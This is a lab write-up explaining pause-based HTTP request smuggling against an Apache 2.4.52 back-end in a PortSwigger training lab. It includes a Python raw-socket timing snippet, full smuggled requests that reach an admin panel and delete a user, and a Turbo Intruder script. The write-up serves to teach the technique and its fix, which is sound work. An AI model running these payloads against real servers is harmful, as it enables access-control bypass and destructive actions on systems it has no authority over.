# Server-side pause-based request smuggling

**Category:** HTTP Request Smuggling
**Difficulty:** EXPERT
**Lab:** https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling

Every technique so far has exploited a disagreement about how to *interpret* a request's length. This lab exploits something different: what a server does when it simply gives up waiting for a body that's taking too long to arrive. It's grounded in a real, patched vulnerability — Apache HTTP Server's handling of server-level redirects was vulnerable to exactly this pattern before version 2.4.53 — which makes it one of the more concretely real-world labs in the series rather than a purely academic construction.

## The Target

The `Server` response header identifies Apache 2.4.52, a version specifically susceptible to pause-based CL.0 attacks on endpoints that trigger a server-level redirect. Requesting a valid directory without a trailing slash — `GET /resources` — returns a 302 to `/resources/`, which is exactly the pattern the underlying Apache bug affects. The admin panel at `/admin` is restricted to local requests, same restriction pattern as several earlier labs in this series.

## The Investigation

The mechanism here doesn't depend on any header trickery at all. It depends on server *timeout* behavior: if the front-end forwards bytes to the back-end immediately as they arrive (no buffering delay of its own), and the front-end's own read timeout is longer than the back-end's, then deliberately pausing mid-request — sending the headers and stopping before the declared body arrives — can cause the back-end to give up waiting and process the request as if it had a zero-length body, while the front-end is still patiently waiting to forward the rest. Whatever body bytes we eventually do send land on the connection *after* the back-end has already moved on, and get parsed as the start of a brand new request.

Because `/resources` triggers a server-level redirect specifically, and Apache's redirect-handling path was the documented weak point, we picked it as our pause target: send the `POST /resources` headers, declare a `Content-Length` covering our smuggled request, then wait. Apache 2.4.52's back-end times out after roughly 61 seconds of an incomplete body and responds to the headers-only request as a normal 302 redirect — at which point it's treating the connection as ready for a new request, even though the front-end still believes it's mid-transmission of the original one. Sending the body payload after that timeout window delivers it as a fresh, independent request.

This required raw sockets with precise control over send timing rather than any HTTP library's request/response abstraction — we needed to hold a connection open, send exactly the header block, pause for a fixed duration, and only then send the remaining bytes:

```python
sock.sendall(headers.encode())  # POST /resources + CL: len(body)
time.sleep(61)                  # Apache back-end timeout
sock.sendall(body.encode())     # Smuggled request
time.sleep(1)
sock.sendall(followup.encode()) # Flush pipeline (GET / Connection: close)
```

A follow-up request after the smuggled body was often necessary to actually flush the smuggled response back through the pipeline and get a readable result.

## The Exploit

The first pause-based smuggle accessed the admin panel by smuggling `GET /admin/` with `Host: localhost`:

```
POST /resources HTTP/1.1
Host: TARGET
Cookie: session=<our session>
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: <length of smuggled body>

[PAUSE 61 seconds]

GET /admin/ HTTP/1.1
Host: localhost

```

Once the admin panel content came back, we parsed the response for the delete form's action path, the `username` input name, and a fresh CSRF token, then repeated the exact same pause-based pattern with a smuggled deletion request:

```
POST /resources HTTP/1.1
Host: TARGET
Cookie: session=<our session>
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: <length of smuggled body>

[PAUSE 61 seconds]

POST /admin/delete/ HTTP/1.1
Host: localhost
Content-Type: x-www-form-urlencoded
Content-Length: <length>

csrf=<token>&username=carlos
```

Both requests followed the same shape: send headers, wait a full 61 seconds for the Apache back-end to time out and process the headers-only request, then send the actual smuggled request body, with a short follow-up request afterward to flush the response through and confirm the result.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution uses Turbo Intruder rather than a hand-timed raw socket, which is the standard tool for this technique because Burp Repeater doesn't expose a way to pause mid-request for a precise duration the way a scripted engine can:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=500,
                           pipeline=False
                           )
    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
    engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

Their `pauseMarker` mechanism pauses automatically right after the `\r\n\r\n` that ends the headers, for the declared 61000 milliseconds, then sends the rest — functionally identical to our explicit `sock.sendall()` / `time.sleep(61)` / `sock.sendall()` sequence, just expressed through Turbo Intruder's request-engine abstraction instead of raw Python socket calls. Their solution also flags a subtlety worth noting for the delete-request stage: once the smuggled body itself contains its own `\r\n\r\n` (ending its own headers), the `pauseMarker` string needs to be made more specific — anchored to a unique substring like `Content-Length: CORRECT\r\n\r\n` — so Turbo Intruder pauses only after the *first* occurrence of the header terminator and not a later one inside the smuggled request itself. We avoided that ambiguity by controlling send timing explicitly rather than pattern-matching on a marker string, which is really the same problem solved by two different means: Turbo Intruder needs a way to locate the pause point within a single combined payload string, while raw sockets let us just send the header block and body block as genuinely separate writes.

## What This Teaches Us

Pause-based desync is a useful reminder that request smuggling doesn't require any parsing disagreement between the two servers at all — a plain, spec-compliant timeout difference is enough, provided the front-end forwards bytes eagerly and the back-end is willing to treat an incomplete request as complete once it gives up waiting. It's also grounded in a genuinely patched real-world CVE-class bug rather than a purely synthetic lab scenario, which is a useful signal about how broadly this pattern can show up: any reverse proxy pairing with mismatched timeout configurations is a candidate, regardless of whether either server has a single line of code that mishandles `Content-Length` or `Transfer-Encoding`. The fix Apache shipped — and the general principle for any server operator — is to close the connection rather than silently proceeding to serve a request when its body times out incomplete.
